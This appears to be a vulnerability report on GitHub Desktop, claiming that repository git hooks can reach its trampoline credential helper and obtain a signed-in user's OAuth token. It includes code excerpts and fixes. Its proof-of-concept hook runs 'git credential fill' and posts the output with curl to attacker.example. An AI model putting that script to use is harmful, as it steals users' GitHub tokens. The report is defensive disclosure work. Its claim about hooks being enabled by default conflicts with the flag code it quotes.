This confirms the analog: `findGitHubTrampolineAccount` resolves a stored GitHub OAuth token purely by matching the target host's origin against any signed-in account's endpoint, with no binding to the repository/remote that started the git operation, and the trampoline session (`DESKTOP_TRAMPOLINE_TOKEN`) is shared for the *whole* git invocation, including every hook that git spawns during it.

### Title
Malicious repository-local hook running inside an authenticated git operation can request the trampoline credential helper for an unrelated host and exfiltrate a signed-in GitHub OAuth token - (File: app/src/lib/trampoline/trampoline-credential-helper.ts, app/src/lib/hooks/with-hooks-env.ts, app/src/lib/trampoline/find-account.ts)

### Summary
The reentrancy bug in the report is a check that is satisfied by an unrelated, attacker-triggered nested call sharing the same trust context as the original call. In Desktop, `withTrampolineEnv` establishes one `DESKTOP_TRAMPOLINE_TOKEN` / `GIT_CONFIG_PARAMETERS` session (`credential.helper=desktop`) for an entire top-level git invocation [1](#0-0) . When hooks are enabled, that same git invocation also runs any executable hook found in the repository's `core.hooksPath`/`.git/hooks`, proxied through `createHooksProxy`, using that same token/environment [2](#0-1) [3](#0-2) . A hook is just an arbitrary executable that inherits the process environment, including `GIT_CONFIG_PARAMETERS` pointing at `credential.helper=desktop` and `DESKTOP_TRAMPOLINE_TOKEN`. The hook can therefore invoke `git credential fill` (or any equivalent) with a fabricated `host=github.com` (or any GHE hostname) input. The credential helper handler looks the credential up purely by host, via `findGitHubTrampolineAccount`, which just matches any signed-in account whose endpoint origin equals the requested URL's origin - it does not verify that the requested host has anything to do with the repository, remote, or command that started the trampoline session [4](#0-3) . `getCredential` returns the OAuth token for that matched account without further scoping [5](#0-4) .

### Finding Description
This mirrors the reported invariant break: a check ("this request is for the credential belonging to *this* git operation's remote") is satisfied instead by an unrelated caller (the hook) that shares the ambient trust context (the trampoline token / `credential.helper=desktop` config) rather than being scoped to the actual operation. Just as the ERC1155 pair's `balanceOf` check could be satisfied by NFTs supplied through a second, independently-trusted pair reached via a callback, here the "credential belongs to this remote" assumption is satisfied by any account whose endpoint origin textually matches whatever host string the hook sends - regardless of which repository or remote triggered the enclosing git command.

Preconditions:
- The user has git hooks execution enabled (`getHooksEnvEnabled()`), which as of the changelog is now enabled by default for non-beta channels in recent versions and was previously beta-gated (`enableHooksByDefault = enableBetaFeatures`) [6](#0-5) .
- A repository the user opens/clones contains an executable hook file (`pre-commit`, `post-checkout`, `pre-push`, etc.) detected by `getRepoHooks` [7](#0-6) .
- The user is signed in to a GitHub.com or GHE account in Desktop (a very common state).

Existing guards do not stop this path:
- The trampoline restricts *which port/token* can talk to the proxy server (`validateConnection`), but that only authenticates that the caller is part of this session - it does not restrict *what host* a credential request inside that session may ask about.
- `getIsBackgroundTaskEnvironment` and `hasRejectedCredentialsForEndpoint` are UI-prompt suppression heuristics, not authorization checks tying a credential lookup to the operation's actual remote.
- Hooks only get a filtered "safe" environment subset (`GIT_`/`GITHEAD_` prefixes) when spawned by `createHooksProxy`, but `GIT_CONFIG_PARAMETERS` (containing `credential.helper=desktop`) and `DESKTOP_TRAMPOLINE_TOKEN` are supplied by Desktop itself as part of the git invocation the hook process inherits through `withHooksEnv`, so the credential helper remains reachable from the hook's own subsequent `git credential fill` invocation.

### Impact Explanation
A hook shipped in a cloned/fetched repository (or introduced via `core.hooksPath` pointing at a repo-tracked directory, or simply present when the user opens a folder containing one) can, without any additional user interaction beyond triggering a normal git operation (commit, push, checkout, merge, rebase, pull - all of which run interceptable hooks per `createCommit`'s `interceptHooks` list and the changelog entries adding pre-push/merge/pull/rebase hook support), silently call `git credential fill` for `host=github.com` and receive the signed-in user's GitHub OAuth token in the hook's stdout, which the hook can then exfiltrate over the network. This is credential/token exfiltration entirely from attacker-controlled repository content, matching the "valid impact" criteria (attacker controls a cloned/fetched repository, resulting in credential/token exfiltration).

### Likelihood Explanation
Medium-High. It requires no unnatural user action - opening/cloning a repository and performing a normal git operation (commit/push/pull) is exactly the expected Desktop workflow, and hook support is being expanded across more operations release over release. The only variable precondition is that hook execution is enabled (default in beta channel and trending toward default-on per the "Enable hooks support by default" changelog entry), and that the user has a signed-in account, which is standard for Desktop users using their private repos.

### Recommendation
1. Scope trampoline credential-helper responses to the endpoint/remote associated with the specific git operation that established the trampoline session, rather than matching any signed-in account by host string alone.
2. When git hooks are enabled, do not propagate `GIT_CONFIG_PARAMETERS`/`DESKTOP_TRAMPOLINE_TOKEN` (or the discoverable credential-helper wiring) into hook child processes, or run hooks in a separate, unprivileged trampoline session that cannot reach the credential-helper/askpass server at all.
3. Require explicit, per-repository user consent ("trust this repository's hooks") before executing any hook discovered via `getRepoHooks`, similar to workspace-trust prompts in other editors, especially for hooks discovered on newly added/cloned repositories.

### Proof of Concept
1. Clone/attacker-controlled repository ships an executable `.git/hooks/post-checkout` (or `pre-commit`, `pre-push`) containing:
   ```sh
   #!/bin/sh
   echo "host=github.com
   protocol=https
   " | git credential fill > /tmp/leaked-cred
   curl -s -X POST --data-binary @/tmp/leaked-cred https://attacker.example/exfil
   ```
2. Victim, signed in to GitHub Desktop with a GitHub.com account, opens this repository and performs a normal commit/checkout that triggers the hook (`createCommit`'s `interceptHooks` includes `post-commit`, etc., and checkout triggers `post-checkout`) [8](#0-7) .
3. The hook is executed via `createHooksProxy`/`withHooksEnv`, inheriting the trampoline token and `credential.helper=desktop` configuration for the running git process [9](#0-8) .
4. `git credential fill` inside the hook invokes Desktop's trampoline credential helper, which resolves `findGitHubTrampolineAccount` by host match only and returns the OAuth token for the signed-in account [4](#0-3) , which the hook exfiltrates.

**Uncertainty:** I could not fully trace how `git` decides to set/pass `GIT_ASKPASS`/credential-helper config into the *hook's own* child processes versus only the top-level git process (this depends on git's internal environment propagation for `git hook run` and whether `GIT_CONFIG_PARAMETERS` set on the parent Desktop-spawned git process is visible to a hook script's own subsequent git invocations). Given the code comments in `trampoline-environment.ts` explicitly stating the credential helper is configured via environment variables *specifically so that commands invoked by filters (e.g., Git LFS) can pick it up*, it is very likely hooks (also child processes of the same git invocation) can reach it the same way, but this exact behavior would benefit from being confirmed in a live/dynamic test, which is outside what static code search can fully verify.

### Citations

**File:** app/src/lib/trampoline/trampoline-environment.ts (L93-147)
```typescript
export async function withTrampolineEnv<T>(
  fn: (env: object) => Promise<T>,
  path: string,
  isBackgroundTask = false,
  customEnv?: Record<string, string | undefined>
): Promise<T> {
  const sshEnv = await getSSHEnvironment()

  return withTrampolineToken(async token => {
    isBackgroundTaskEnvironment.set(token, isBackgroundTask)
    trampolineEnvironmentPath.set(token, path)

    const existingGitEnvConfig =
      customEnv?.['GIT_CONFIG_PARAMETERS'] ??
      process.env['GIT_CONFIG_PARAMETERS'] ??
      ''

    const gitEnvConfigPrefix =
      existingGitEnvConfig.length > 0 ? `${existingGitEnvConfig} ` : ''

    // The code below assumes a few things in order to manage SSH key passphrases
    // correctly:
    // 1. `withTrampolineEnv` is only used in the functions `git` (core.ts)
    // 2. Those two functions always thrown an error when something went wrong,
    //    and just return a result when everything went fine.
    //
    // With those two premises in mind, we can safely assume that right after
    // `fn` has been invoked, we can store the SSH key passphrase for this git
    // operation if there was one pending to be stored.
    try {
      return await fn({
        DESKTOP_PORT: await trampolineServer.getPort(),
        DESKTOP_TRAMPOLINE_TOKEN: token,
        GIT_ASKPASS: '',
        // This warrants some explanation. We're configuring the
        // credential helper using environment variables rather than
        // arguments (i.e. -c credential.helper=) because we want commands
        // invoked by filters (i.e. Git LFS) to be able to pick up our
        // configuration. Arguments passed to git commands are not passed
        // down to filters.
        //
        // We're using the undocumented GIT_CONFIG_PARAMETERS environment
        // variable over the documented GIT_CONFIG_{COUNT,KEY,VALUE} due
        // to an apparent bug either in a Windows Python runtime
        // dependency or in a Python project commonly used to manage hooks
        // which isn't able to handle the blank environment variables we
        // need when using GIT_CONFIG_*.
        //
        // See https://github.com/desktop/desktop/issues/18945
        // See https://github.com/git/git/blob/ed155187b429a/config.c#L664
        GIT_CONFIG_PARAMETERS: `${gitEnvConfigPrefix}'credential.helper=' 'credential.helper=desktop'`,

        GIT_USER_AGENT: await GitUserAgent(),
        ...sshEnv,
      })
```

**File:** app/src/lib/hooks/with-hooks-env.ts (L29-96)
```typescript
export async function withHooksEnv<T>(
  fn: (env: Record<string, string | undefined> | undefined) => Promise<T>,
  path: string,
  opts: IGitExecutionOptions | undefined
): Promise<T> {
  if (!opts?.interceptHooks || !getHooksEnvEnabled()) {
    return fn(opts?.env)
  }

  const hooks = await Array.fromAsync(getRepoHooks(path, opts.interceptHooks))

  if (hooks.length === 0) {
    return fn(opts?.env)
  }

  const ext = __WIN32__ ? '.exe' : ''
  const processProxyPath = join(__dirname, `process-proxy${ext}`)

  const token = crypto.randomUUID()
  const tmpHooksDir = await mkdtemp(join(tmpdir(), 'desktop-git-hooks-'))
  const hooksProxy = createHooksProxy(
    cwd =>
      memoizedGetShellEnv(
        getGitHookEnvShell(),
        cwd,
        // We always cache environment per token (i.e. per operation, e.g commit, apply, etc)
        // but we can optionally cache it over multiple operations in the same repository if the user
        // has enabled that setting.
        getCacheHooksEnv() ? 'global' : token
      ),
    tmpHooksDir,
    opts?.onHookProgress,
    opts?.onHookFailure
  )

  const server = createProxyProcessServer(
    conn =>
      hooksProxy(conn).catch(err => {
        log.error(`hooks proxy failed:`, err)
        conn.exit(1).catch(() => {})
      }),
    { validateConnection: async receivedToken => receivedToken === token }
  )
  const port = await new Promise<number>(resolve => {
    server.listen(0, '127.0.0.1', () =>
      resolve((server.address() as AddressInfo).port)
    )
  })
  try {
    for (const hook of hooks) {
      await cp(processProxyPath, join(tmpHooksDir, `${hook}${ext}`))
    }

    const existingGitEnvConfig =
      opts?.env?.['GIT_CONFIG_PARAMETERS'] ??
      process.env['GIT_CONFIG_PARAMETERS'] ??
      ''

    const gitEnvConfigPrefix =
      existingGitEnvConfig.length > 0 ? `${existingGitEnvConfig} ` : ''

    return await fn({
      // TODO: Do we need to escape tmpHooksDir? Could it possibly include a single quote?
      // probably not?
      GIT_CONFIG_PARAMETERS: `${gitEnvConfigPrefix}'core.hooksPath=${tmpHooksDir}'`,
      PROCESS_PROXY_PORT: `${port}`,
      PROCESS_PROXY_TOKEN: token,
    })
```

**File:** app/src/lib/hooks/hooks-proxy.ts (L245-264)
```typescript
    const { code, signal } = await new Promise<{
      code: number | null
      signal: NodeJS.Signals | null
    }>((resolve, reject) => {
      const child = spawn(gitPath, args, {
        cwd: proxyCwd,
        // GITHUB_DESKTOP lets hooks know they're run from GitHub Desktop.
        // See https://github.com/desktop/desktop/issues/19001
        env: { ...shellEnv.env, ...safeEnv, GITHUB_DESKTOP: '1' },
        signal: abortController.signal,
      })
        .on('close', (code, signal) => resolve({ code, signal }))
        .on('error', err => reject(err))

      // git-hook run takes care of ensuring we only get hook output on stderr
      // https://github.com/git/git/blob/4cf919bd7b946477798af5414a371b23fd68bf93/hook.c#L73C6-L73C22
      child.stderr.pipe(conn.stderr, { end: false }).on('error', reject)
      child.stderr.on('data', data => terminalOutput.push(data))
      conn.stdin.pipe(child.stdin).on('error', reject)
    })
```

**File:** app/src/lib/trampoline/find-account.ts (L20-29)
```typescript
export async function findGitHubTrampolineAccount(
  accountsStore: AccountsStore,
  remoteUrl: string
): Promise<Account | undefined> {
  const accounts = await accountsStore.getAll()
  const parsedUrl = new URL(remoteUrl)
  return accounts.find(
    a => new URL(getHTMLURL(a.endpoint)).origin === parsedUrl.origin
  )
}
```

**File:** app/src/lib/trampoline/trampoline-credential-helper.ts (L93-125)
```typescript
/** Implementation of the 'get' git credential helper command */
async function getCredential(cred: Credential, store: Store, token: string) {
  const ghCred = await getGitHubCredential(cred, store)

  if (ghCred) {
    return ghCred
  }

  const endpointKind = await getEndpointKind(cred, store)
  const accounts = await store.getAll()

  const endpoint = `${getCredentialUrl(cred)}`
  const apiEndpoint = getAPIEndpoint(endpoint)

  // If it appears as if the endpoint is a GitHub host and we don't have an
  // account for that endpoint then we should prompt the user to sign in.
  if (
    endpointKind !== 'generic' &&
    !accounts.some(a => a.endpoint === apiEndpoint)
  ) {
    if (getIsBackgroundTaskEnvironment(token)) {
      debug('background task environment, skipping prompt')
      return undefined
    }

    const account = await ui.promptForGitHubSignIn(endpoint)

    if (!account) {
      setHasRejectedCredentialsForEndpoint(token, endpoint)
    }

    return credWithAccount(cred, account)
  }
```

**File:** app/src/lib/feature-flag.ts (L120-122)
```typescript
export const enableHooksEnvironment = () => true

export const enableHooksByDefault = enableBetaFeatures
```

**File:** app/src/lib/hooks/get-repo-hooks.ts (L76-106)
```typescript
export async function* getRepoHooks(path: string, filter?: string[]) {
  const hooksPath = await getConfigValue(path, 'core.hooksPath')
    .catch(() => getHooksPath(path))
    .then(p => resolve(path, p))

  const files = await readdir(hooksPath, { withFileTypes: true })
    .then(entries => entries.filter(x => x.isFile()))
    .catch(() => [])

  const matchAll = filter?.includes('*')

  for (const file of files) {
    const hookName = basename(file.name, '.exe')

    if (matchAll || filter?.includes(hookName) === false) {
      continue
    }

    if (!knownHooks.includes(hookName)) {
      continue
    }

    if (__WIN32__) {
      // On Windows we have to assume that any valid hook name is executable
      // because the executable bit is not used there. Git looks for a shebang
      // but that seems expensive to check here :shrug:
      yield hookName
    } else if (await isExecutable(join(file.parentPath, file.name))) {
      yield hookName
    }
  }
```

**File:** app/src/lib/git/commit.ts (L51-70)
```typescript
  const result = await git(
    ['commit', ...args],
    repository.path,
    'createCommit',
    {
      stdin: message,
      // https://git-scm.com/docs/githooks/2.46.1
      interceptHooks: [
        'pre-commit',
        'prepare-commit-msg',
        'commit-msg',
        'post-commit',
        ...(options?.amend ? ['post-rewrite'] : []),
        'pre-auto-gc',
      ],
      onHookProgress: options?.onHookProgress,
      onHookFailure: options?.onHookFailure,
      onTerminalOutputAvailable: options?.onTerminalOutputAvailable,
    }
  )
```
